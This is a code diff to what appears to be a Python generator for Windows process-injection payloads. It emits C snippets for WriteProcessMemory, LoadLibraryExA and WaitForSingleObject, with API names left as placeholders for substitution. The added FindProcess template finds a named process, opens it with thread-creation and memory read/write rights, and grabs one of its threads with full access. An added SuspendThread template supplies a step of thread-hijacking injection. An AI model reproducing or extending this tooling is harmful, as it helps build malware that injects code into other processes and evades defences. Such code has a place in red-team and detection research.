@@ -73,7 +73,7 @@ def WriteProcessMemory(ProcessHandle, destination, source, length):
 
 def WaitForSingleObject(hHandle, dwMilliseconds):
     return Template("""
-        {WaitForSingleObject}($hHandle, $dwMilliseconds);             
+    {WaitForSingleObject}($hHandle, $dwMilliseconds);             
 """).substitute(hHandle=hHandle, dwMilliseconds=dwMilliseconds)
 
 def NtWaitForSingleObject(hHandle, dwMilliseconds):
@@ -192,3 +192,53 @@ def LoadLibraryExA(output, lpLibfileName, dwFlags):
     return Template("""
     HMODULE $output  = {LoadLibraryExA}( "$lpLibfileName", NULL, DONT_RESOLVE_DLL_REFERENCES );
 """).substitute(output=output, lpLibfileName=lpLibfileName, dwFlags=dwFlags)
+
+def FindProcess(target):
+    return Template("""
+    int pid = 0;
+    HANDLE hProcess = NULL;
+    HANDLE hThread = NULL;
+    HANDLE hProcSnap;
+    PROCESSENTRY32 pe32;
+            
+    hProcSnap = {CreateToolhelp32Snapshot}(TH32CS_SNAPPROCESS, 0);
+    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
+            
+    pe32.dwSize = sizeof(PROCESSENTRY32); 
+            
+    if (!{Process32First}(hProcSnap, &pe32)) {{
+            CloseHandle(hProcSnap);
+            return 0;
+    }}
+            
+    while ({Process32Next}(hProcSnap, &pe32)) {{
+        if (lstrcmpiA("$target", pe32.szExeFile) == 0) {{
+                pid = pe32.th32ProcessID;
+                break;
+        }}
+    }}
+            
+    {CloseHandle}(hProcSnap);
+
+    // try to open target process
+    hProcess = {OpenProcess}( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD) pid);
+
+    THREADENTRY32 thEntry;
+    thEntry.dwSize = sizeof(thEntry);
+    HANDLE Snap = {CreateToolhelp32Snapshot}(TH32CS_SNAPTHREAD, 0);
+
+    while ({Thread32Next}(Snap, &thEntry))
+    {{
+        if (thEntry.th32OwnerProcessID == pid)
+        {{
+            hThread = {OpenThread}(THREAD_ALL_ACCESS, FALSE, thEntry.th32ThreadID);
+            break;
+        }}
+    }}
+    CloseHandle(Snap);
+""").substitute(target=target)
+
+def SuspendThread(hThread):
+    return Template("""
+    {SuspendThread}($hThread);
+""").substitute(hThread=hThread)
